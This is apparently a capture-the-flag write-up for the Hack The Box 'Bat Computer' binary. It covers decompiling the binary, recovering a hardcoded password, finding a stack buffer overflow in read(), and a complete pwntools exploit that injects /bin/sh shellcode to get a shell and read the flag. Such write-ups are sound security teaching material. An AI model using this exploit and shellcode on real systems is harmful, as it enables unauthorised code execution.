# Bat Computer
## Behaviour
When running the binary, the user in asked to either track or chase Joker. When selecting track, a memory address is given for the location of Joker. When chase is selected, a prompt is given for the password. The password is easily determined through static analysis of the binary [1]:

## Static Analysis
### Ghidra decompilation:

```c
undefined8 FUN_001011ec(void)

{
  int iVar1;
  int local_68;
  char acStack_64 [16];
  undefined auStack_54 [76];
  
  FUN_001011a9();
  while( true ) {
    while( true ) {
      memset(acStack_64,0,0x10);
      printf(
            "Welcome to your BatComputer, Batman. What would you like to do?\n1. Track Joker\n2. Cha se Joker\n> "
            );
      __isoc99_scanf(&DAT_00102069,&local_68);
      if (local_68 != 1) break;
      printf("It was very hard, but Alfred managed to locate him: %p ",auStack_54);
    }
    if (local_68 != 2) break;
    printf("Ok. Let\'s do this. Enter the password: ");
    __isoc99_scanf(&DAT_001020d0,acStack_64);
    iVar1 = strcmp(acStack_64,"b4tp@$$w0rd!");                           // [1]
    if (iVar1 != 0) {
      puts("The password is wrong.\nI can\'t give you access to the BatMobile!");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    printf("Access Granted. \nEnter the navigation commands: ");
    read(0,auStack_54,0x89);                             //[2]
    puts("Roger that!");
  }
  puts("Too bad, now who\'s gonna save Gotham? Alfred?");
  return 0;
}
```
### Vulnerability

The above code uses the `read()` function [2], which reads in more bytes than the allocated buffer of the variable it's reading into.

## Test Input

```bash
└─$ msf-pattern_create -l 100               
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```
This pattern is then entered as input for the navigation commands:

```python
io = start()

io.recvuntil(b"> ")
io.sendline(b"2")

io.recvuntil(b"password: ")
io.sendline(b"b4tp@$$w0rd!")
io.recvuntil(b"Enter the navigation commands: ")
payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
io.sendline(payload)
io.recvuntil(b"> ")
io.sendline(b"3")

io.interactive()
```
## Dynamic Analysis
The script is ran locally with debugging using `./test.py LOCAL GDB`
After the segmentation fault has occurred, the contents of the registers were displayed using `i r` (info registers):

```bash
Program received signal SIGSEGV, Segmentation fault.
0x0000558d0c63d31f in ?? ()
[...]
rbp            0x3763413663413563  0x3763413663413563
[...]
```
The contents of `ebp` were then used to determine the offset of `ebp`. 

```bash
└─$ msf-pattern_offset -q 0x3763413663413563
[*] Exact match at offset 76
```
## Exploitation
A script was created to parse the output for the address given when selecting 'Track Joker', and used with padding to overwrite `rip` with that address, which has an offset +8 bytes from `rbp`. Shellcode was added to the beginning of the payload, so that it is executed when the `eip` returns the program to the beginning of the buffer:

```python
io = start()

io.recvuntil(b"> ")
io.sendline(b"1")
output = io.recvuntil(b"> ")
print(output)
io.sendline(b"2")

addr = output[54:66] # parse address from output
addr = int(addr, 16) # convert address to hex
addr = p64(addr,endian="little") # set address endianness to little
print(addr)

shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
# x86_64 execveat("/bin//sh") shellcode from http://shell-storm.org/shellcode/files/shellcode-905.html by ZadYree, vaelio, DaShrooms
shellcode_len = len(shellcode) # shellcode length
padding = b"A" * ( 84 - shellcode_len) # create necessary padding
io.recvuntil(b"password: ")
io.sendline(b"b4tp@$$w0rd!")
io.recvuntil(b"Enter the navigation commands: ")
payload = shellcode+padding+addr # concatenated payload
io.sendline(payload)
io.recvuntil(b"> ")
io.sendline(b"3")	 # erroneous input to break from the program loop

io.interactive()
```
The script was then executed with the live IP and Port for the challenge:
`./solution.py HOST=[ip addr] PORT=[port]`
```txt
b'It was very hard, but Alfred managed to locate him: 0x7ffdfb215ac4\nWelcome to your BatComputer, Batman. What would you like to do?\n1. Track Joker\n2. Chase Joker\n> '
[*] Switching to interactive mode
Too bad, now who's gonna save Gotham? Alfred?
$ ls
batcomputer
flag.txt
$ cat flag.txt
HTB{[flag]}
$
```